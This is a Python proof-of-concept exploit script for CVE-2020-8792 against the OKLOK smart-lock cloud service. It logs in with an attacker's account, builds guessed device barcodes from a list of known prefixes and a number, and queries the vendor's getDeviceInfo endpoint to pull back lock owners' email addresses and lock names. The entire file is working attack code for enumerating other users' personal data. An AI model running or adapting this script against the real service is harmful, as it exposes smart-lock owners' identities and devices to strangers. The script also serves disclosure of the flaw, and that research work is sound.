#!/usr/bin/env python3

#PoC for CVE-2020-8792
#Get OKLOK email address and lock name from predicted barcode

import requests
import json
import sys
import getpass

#grab the attacker token to be used in HTTP headers for other requests
def login_attacker(attacker_email_address, attacker_password):
        
    login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
    login_body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

    login_headers = {'Host': 'app.oklok.com.cn',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Accept-Language': 'en-US;q=1',
    'Content-Length': '70',
    'Accept-Encoding': 'gzip, deflate, br'}

    print('\n-------------------------------------------------------------')
    print('[*] Logging in...')

    
    response = requests.post(login_url, data=json.dumps(login_body), headers=login_headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('[*] Login successful\n')
        print('=============================================================')
        print('ATTACKER LOGIN DETAILS:')
        print('=============================================================')
        result = json_resp['result']
        attacker_token = result['token']
        attacker_userId = result['userId']
        print('attacker_token: ' + str(attacker_token))
        print('attacker_userId: ' + str(attacker_userId))
        print('-------------------------------------------------------------\n')
        return attacker_token

    else:
        sys.exit('[*] Login not successful.')

#construct barcode guess
#retrieve email address and lock name 
def querydevice(number, attacker_token):

    prefix_choice = input('Choose a 4-char prefix: \n1. GFYY\n2. UBAN\n3. XBAN\n4. UFCY\n5. UFAY\n6. UBAY\n7. QBAN\n8. Other\n')

    other=''
    if prefix_choice == '8':
        other = input('\nEnter a 4-char prefix:\n')
        if len(other) != 4:
            sys.exit('Incorrect prefix length.')

    prefix = {1: 'GFYY', 2: 'UBAN', 3: 'XBAN', 4: 'UFCY', 5: 'UFAY', 6: 'UBAY', 7: 'QBAN', 8: other}
    if prefix_choice not in ('1', '2', '3', '4', '5', '6', '7', '8'):
        sys.exit('Invalid choice.')

    qd_url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'

    headers = {'Host': 'app.oklok.com.cn',
    'phoneModel': 'iPhone11,8',
    'Accept': '*/*',
    'appVersion': '3.1.1',
    'Accept-Language': 'en-US;q=1',
    'Accept-Encoding': 'gzip, deflate, br',
    'token': attacker_token,
    'Content-Type': 'application/json',
    'Content-Length': '26',
    'clientType': 'iOS',
    'language': 'en-US',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Connection': 'keep-alive',
    'osVersion': '13.3'}
    
    number = str(number).zfill(8)
    barcode = prefix.get(int(prefix_choice)) + number
    print('-------------------------------------------------------------')
    print(f'[*] Querying device by barcode {barcode}...')
    qd_body = {"barcode":barcode}
    response = requests.post(qd_url, data=json.dumps(qd_body), headers=headers)
    json_resp = response.json()
    status = json_resp['status']
    result = json_resp['result']
    if status == '2000':
        if len(result)!=0:
            print('[*] Barcode found\n')
            print('=============================================================')
            print('USER ACCOUNT/LOCK INFO:')
            print('=============================================================')
            email_address = result['account']
            lock_name = result['name']
            print('email address: ' + str(email_address))
            print('lock name: ' + str(lock_name))
            print('-------------------------------------------------------------\n')
        else:
            print('[*] No results found.')
            print('-------------------------------------------------------------\n')
    else:
        print('HTTP Error - Device could not be queried.')
        print('-------------------------------------------------------------\n')


def main():

    if len(sys.argv) is not 3:
        sys.exit('Usage: python3 ownklok_barcode.py <number> <attacker_email_address>')
    elif len(sys.argv[1]) > 8:
        sys.exit('Too many digits (must be <= 8).')
    elif int(sys.argv[1]) < 0:
        sys.exit('Usage: python3 ownklok_barcode.py <number> <attacker_email_address>. Cannot use a negative number.')
    else:
        number = int(sys.argv[1])
        attacker_email_address = sys.argv[2]
        attacker_password = getpass.getpass('Attacker Password: ')

    attacker_token = login_attacker(attacker_email_address, attacker_password)

    querydevice(number, attacker_token)


if __name__ == '__main__':
    main()
